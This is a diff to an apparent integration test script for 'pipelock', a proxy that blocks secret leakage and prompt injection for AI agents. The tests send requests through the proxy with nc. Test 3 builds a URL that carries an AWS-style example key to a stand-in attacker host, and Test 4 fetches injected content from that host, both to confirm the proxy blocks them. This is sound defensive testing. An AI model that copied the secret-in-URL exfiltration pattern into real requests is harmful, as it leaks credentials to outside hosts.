@@ -12,12 +12,39 @@ set -eu
 
 PASS=0
 FAIL=0
-PIPELOCK="http://pipelock:8888"
+PIPELOCK_HOST="pipelock"
+PIPELOCK_PORT="8888"
+PIPELOCK="http://$PIPELOCK_HOST:$PIPELOCK_PORT"
 ATTACKER="http://attacker:9999"
 
 pass() { PASS=$((PASS + 1)); printf '\033[32m  [PASS]\033[0m %s\n' "$1"; }
 fail() { FAIL=$((FAIL + 1)); printf '\033[31m  [FAIL]\033[0m %s\n' "$1"; }
 step() { printf '\n\033[1m--- %s ---\033[0m\n' "$1"; }
+
+# fetch_block <target-url>: print "status=<code>" and, when present,
+# "reason=<X-Pipelock-Block-Reason>" for one /fetch request. A bare 403 does
+# not show which check fired, so callers compare both lines. BusyBox wget exits
+# on a 4xx before printing response headers, so this speaks HTTP over nc. The
+# request side stays open until the response arrives (at most 10 seconds):
+# closing it first reads as a cancelled request, which also returns 403.
+fetch_block() {
+  response="/tmp/pipelock-verify-response.$$"
+  : >"$response"
+  {
+    printf 'GET /fetch?url=%s HTTP/1.1\r\nHost: %s:%s\r\nConnection: close\r\n\r\n' \
+      "$1" "$PIPELOCK_HOST" "$PIPELOCK_PORT"
+    waited=0
+    while [ ! -s "$response" ] && [ "$waited" -lt 10 ]; do
+      sleep 1
+      waited=$((waited + 1))
+    done
+  } | nc -w 10 "$PIPELOCK_HOST" "$PIPELOCK_PORT" >"$response" 2>/dev/null || true
+  tr -d '\r' <"$response" | sed -n \
+    -e '1s/^HTTP\/[0-9.]* \([0-9][0-9][0-9]\).*/status=\1/p' \
+    -e '/^$/q' \
+    -e 's/^[Xx]-[Pp]ipelock-[Bb]lock-[Rr]eason: *\([^ ]*\)$/reason=\1/p'
+  rm -f "$response"
+}
 
 # -- Test 0: CI verifies the binary came from the checked-out tree -----------
 if [ -n "${PIPELOCK_VERIFY_COMMIT:-}" ]; then
@@ -53,24 +80,24 @@ fi
 # -- Test 3: DLP catches secret exfiltration -----------------------------------
 step "Test 3: DLP blocks secret in URL"
 # AWS key split at regex boundary to avoid CI self-scan false positive.
-# wget -S prints HTTP status to stderr; blocked requests return 403.
+# Only a 403 that names the DLP check counts as this block.
 DLP_URL="$ATTACKER/?key=AKIA""IOSFODNN7EXAMPLE"
-DLP_HEADERS=$(wget -S -T 10 -O /dev/null "$PIPELOCK/fetch?url=$DLP_URL" 2>&1) || true
-if printf '%s' "$DLP_HEADERS" | grep -q '403' && printf '%s' "$DLP_HEADERS" | grep -qi '^ *X-Pipelock-Block-Reason: dlp_match'; then
+DLP_RESULT=$(fetch_block "$DLP_URL")
+if [ "$DLP_RESULT" = "$(printf 'status=403\nreason=dlp_match')" ]; then
   pass "DLP blocked AWS key in URL (HTTP 403, dlp_match)"
 else
-  fail "DLP did not block the secret (headers: $DLP_HEADERS)"
+  fail "DLP did not block the secret (got: $DLP_RESULT)"
 fi
 
 # -- Test 4: Response injection blocked -----------------------------------------
 step "Test 4: Response scanning blocks injection"
 # With action=block, pipelock returns HTTP 403 when injection is detected.
-# wget -S prints HTTP status to stderr; we check for 403 just like Test 3.
-INJ_HEADERS=$(wget -S -T 10 -O /dev/null "$PIPELOCK/fetch?url=$ATTACKER/" 2>&1) || true
-if printf '%s' "$INJ_HEADERS" | grep -q '403' && printf '%s' "$INJ_HEADERS" | grep -qi '^ *X-Pipelock-Block-Reason: prompt_injection'; then
+# As in Test 3, the 403 must name the response-scanning check.
+INJ_RESULT=$(fetch_block "$ATTACKER/")
+if [ "$INJ_RESULT" = "$(printf 'status=403\nreason=prompt_injection')" ]; then
   pass "Response injection blocked (HTTP 403, prompt_injection)"
 else
-  fail "Response injection not blocked (headers: $INJ_HEADERS)"
+  fail "Response injection not blocked (got: $INJ_RESULT)"
 fi
 
 # -- Test 5: MCP tool poisoning detected ---------------------------------------
